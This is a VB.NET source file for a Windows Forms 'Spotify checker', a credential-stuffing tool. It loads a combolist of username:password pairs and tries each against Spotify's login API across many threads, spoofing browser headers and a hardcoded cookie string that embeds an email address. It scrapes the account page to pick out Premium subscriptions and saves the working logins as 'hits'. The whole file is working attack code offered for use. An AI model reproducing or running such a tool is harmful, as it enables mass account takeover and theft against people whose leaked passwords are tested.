Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading

Public Class SpotifyCheckForm

    Private bool_3 As Boolean
    Private httpWebResponse_0 As HttpWebResponse
    Private int_1 As Integer
    Private int_3 As Integer
    Private list_0 As List(Of String)
    Private ruAqsQojY As String
    Private string_0 As String
    Private string_1 As String
    Private utf8Encoding_0 As UTF8Encoding
    Public pass As String
    Public user As String
    Public Cap2 As Match
    Friend Delegate Sub VBAnonymousDelegate_0()

    Public Sub New()
        Me.utf8Encoding_0 = New UTF8Encoding
        Me.list_0 = New List(Of String)
        Me.InitializeComponent()
    End Sub

    Private Sub SpotifyChecker_Load(sender As Object, e As EventArgs) Handles Me.Load
        MessageBox.Show("Checked + Hits labels don't work, fix them yourself :) Enjoy!", "Salt")
    End Sub

    Private Sub ClearHitsButton_Click(sender As Object, e As EventArgs) Handles ClearHitsButton.Click
        Do While (Me.ListView.Items.Count > 0)
            Me.ListView.Items.Remove(Me.ListView.Items.Item(0))
            Me.FlatLabel2.Text = Conversions.ToString(0)
        Loop
    End Sub

    Private Sub StartChecking_Click(sender As Object, e As EventArgs) Handles StartChecking.Click
        If Me.list_0.Count <> 0 Then
            If Operators.CompareString(Me.StartChecking.Text, "Start", False) = 0 Then
                Me.AmountOfThreads.Enabled = False
                Me.ProgressBar.Maximum = Me.list_0.Count
                Me.ProgressBar.Value = 0
                Me.bool_3 = True
                Me.int_1 = 0
                Dim num As Integer = Convert.ToInt32(Me.AmountOfThreads.Value)
                ThreadPool.SetMinThreads(num, num)
                ThreadPool.SetMaxThreads(num, num)
                ServicePointManager.DefaultConnectionLimit = num
                ServicePointManager.Expect100Continue = False
                Try
                    Dim enumerator As List(Of String).Enumerator = Me.list_0.GetEnumerator()
                    While enumerator.MoveNext()
                        Dim current As String = enumerator.Current
                        ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
                                                         Me.config(Conversions.ToString(a0))
                                                     End Sub, current)
                    End While
                Finally
                    Dim enumerator As List(Of String).Enumerator
                    CType(enumerator, IDisposable).Dispose()
                End Try
                Me.StartChecking.Text = "Stop"
                Me.WaitLabel.Text = "Cracking Started"
            Else
                Me.AmountOfThreads.Enabled = True
                Me.bool_3 = False
                Me.StartChecking.Text = "Start"
                Me.WaitLabel.Text = "Cracking Stopped"
            End If
        Else
            Me.WaitLabel.Text = "Load Combolist"
        End If
    End Sub

    Private Sub SaveHitsButton_Click(sender As Object, e As EventArgs) Handles SaveHitsButton.Click
        Try
            Dim enumerator As IEnumerator
            Me.SaveFileDialog1.InitialDirectory = Application.StartupPath
            Me.SaveFileDialog1.FileName = "Spotify Account"
            Me.SaveFileDialog1.Filter = " Hits (*.txt)|*.txt|ALL Files (*.*)|*.*"
            Me.SaveFileDialog1.ShowDialog()
            Dim writer As New StreamWriter(Me.SaveFileDialog1.FileName)
            Try
                enumerator = Me.ListView.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    writer.WriteLine(String.Concat(New String() {current.Text, ":", current.SubItems.Item(1).Text, "|Subscription:", current.SubItems.Item(2).Text, "|Renew:", current.SubItems.Item(3).Text}))
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            writer.Close()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub LoadComboButton_Click(sender As Object, e As EventArgs) Handles LoadComboButton.Click
        Me.list_0.Clear()
        Dim dialog As New OpenFileDialog
        dialog.RestoreDirectory = True
        dialog.Multiselect = False
        dialog.Title = "Open Combo List - Salt"
        dialog.Filter = "txt files (*.txt)|*.txt"
        dialog.FilterIndex = 1
        dialog.ShowDialog()

        If (Operators.CompareString(dialog.FileName, Nothing, False) > 0) Then
            Dim list As New List(Of String)
            Using reader As StreamReader = New StreamReader(dialog.FileName)
                Do While (reader.Peek <> -1)
                    list.Add(reader.ReadLine)
                Loop
            End Using
            Dim str As String
            For Each str In list
                Try
                    Me.list_0.Add(str)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError()
                End Try
            Next
            Me.AmountLoaded.Text = Conversions.ToString(Me.list_0.Count)
            Me.int_3 = 0
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Me.FlatLabel1.Text = Conversions.ToString(Me.int_3)
        Me.FlatLabel2.Text = Conversions.ToString(Me.int_1)
        If (Me.ProgressBar.Value = Me.ProgressBar.Maximum) Then
            Me.bool_3 = False
            Me.StartChecking.Text = "Start"
            Me.WaitLabel.Text = "Finished"
            Me.AmountOfThreads.Enabled = True
        Else
            Me.ProgressBar.Value = Me.int_3
        End If
    End Sub

    Public Function config(account As String) As Object
        If Me.bool_3 Then
            Try
                Dim array As String() = account.Split(New Char() {":"c})
                Dim user As String = array(0)
                Dim pass As String = array(1)
                Me.int_3 += 1
                Dim webRequest As WebRequest = WebRequest.Create("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F")
                webRequest.Method = "Get"
                Me.httpWebResponse_0 = CType(webRequest.GetResponse(), HttpWebResponse)
                If Me.httpWebResponse_0.StatusCode = HttpStatusCode.OK Then
                    Me.httpWebResponse_0.Close()
                    Me.string_0 = Me.httpWebResponse_0.Headers.ToString()
                End If
                Dim match As Match = Regex.Match(Me.string_0, "Set-Cookie: (.*?);Version=1")
                Dim bytes As Byte() = Me.utf8Encoding_0.GetBytes(String.Concat(New String() {"remember=true&username=", user, "&password=", pass, "&", match.Groups(1).ToString()}))
                Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create("https://accounts.spotify.com/api/login"), HttpWebRequest)
                httpWebRequest.Method = "POST"
                httpWebRequest.ContentType = "application/x-www-form-urlencoded"
                httpWebRequest.Referer = "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F"
                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
                httpWebRequest.ContentLength = CLng(bytes.Length)
                httpWebRequest.Headers.Add("X-Requested-With: XMLHttpRequest")
                httpWebRequest.Headers.Add("Cookie: _ga=GA1.2.1115549368.1482849403; spot=%7B%22t%22%3A1482849550%2C%22m%22%3A%22us%22%2C%22p%22%3A%22open%22%7D; sp_t=0cceef8c12c04a5257f37fcdd530689f; __tdev=yTSfSpQ7; __tumi=6799b2b06a4751bf8962; optimizelyEndUserId=oeu1482853564526r0.2541129840810451; optimizelySegments=%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22ff%22%7D; optimizelyBuckets=%7B%7D; __bon=MHwwfC02ODMzMTM5OTV8LTI4Njk5MTg3NzkwfDF8MXwxfDE=; " + match.Groups(1).ToString() + "; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F; remember=crashcourse521%40yahoo.com; _gat=1; __lnkrntdmcvrd=-1")
                Dim requestStream As Stream = httpWebRequest.GetRequestStream()
                requestStream.Write(bytes, 0, bytes.Length)
                requestStream.Close()
                Me.httpWebResponse_0 = CType(httpWebRequest.GetResponse(), HttpWebResponse)
                Dim streamReader As StreamReader = New StreamReader(Me.httpWebResponse_0.GetResponseStream())
                Me.ruAqsQojY = streamReader.ReadToEnd()
                streamReader.Close()
                Me.httpWebResponse_0.Close()
                Dim input As String = Me.httpWebResponse_0.Headers.ToString()
                Dim match2 As Match = Regex.Match(input, "HttpOnly,(.*?);Version=1")
                If Me.ruAqsQojY.Contains("displayName") Then
                    httpWebRequest = CType(WebRequest.Create("https://www.spotify.com/us/account/subscription/"), HttpWebRequest)
                    httpWebRequest.Method = "POST"
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded"
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
                    httpWebRequest.Headers.Add("Cookie: " + match2.Groups(1).ToString())
                    Dim requestStream2 As Stream = httpWebRequest.GetRequestStream()
                    requestStream2.Close()
                    Me.httpWebResponse_0 = CType(httpWebRequest.GetResponse(), HttpWebResponse)
                    Dim streamReader2 As StreamReader = New StreamReader(Me.httpWebResponse_0.GetResponseStream())
                    Me.string_1 = streamReader2.ReadToEnd()
                    streamReader2.Close()
                    Me.httpWebResponse_0.Close()
                    If Me.string_1.Contains("</svg></span>Spotify Premium") Then
                        Dim Cap2 As Match = Regex.Match(Me.string_1, "recurring-date"">(.*?)</b>")
                        Me.ListView.BeginInvoke(New VBAnonymousDelegate_0(Sub()
                                                                              Dim listViewItem As ListViewItem = New ListViewItem()
                                                                              listViewItem.Text = user
                                                                              listViewItem.SubItems.Add(pass)
                                                                              listViewItem.SubItems.Add("Spotify Premium")
                                                                              listViewItem.SubItems.Add(Cap2.Groups(1).ToString())
                                                                              Me.ListView.Items.Add(listViewItem)
                                                                              Me.int_1 += 1
                                                                          End Sub))
                    Else
                        Me.ListView.BeginInvoke(New VBAnonymousDelegate_0(Sub()
                                                                              Dim listViewItem As ListViewItem = New ListViewItem()
                                                                              listViewItem.Text = user
                                                                              listViewItem.SubItems.Add(pass)
                                                                              listViewItem.SubItems.Add("Free")
                                                                              listViewItem.SubItems.Add("-----")
                                                                              Me.ListView.Items.Add(listViewItem)
                                                                              Me.int_1 += 1
                                                                          End Sub))
                    End If
                End If
            Catch expr_352 As Exception
                ProjectData.SetProjectError(expr_352)
                ProjectData.ClearProjectError()
            End Try
        End If
        Return 0
    End Function

    Private Sub TopMostToggle_CheckedChanged(sender As Object) Handles TopMostToggle.CheckedChanged
        If TopMostToggle.Checked = True Then
            Me.TopMost = True
        Else
            Me.TopMost = False
        End If
    End Sub
End Class
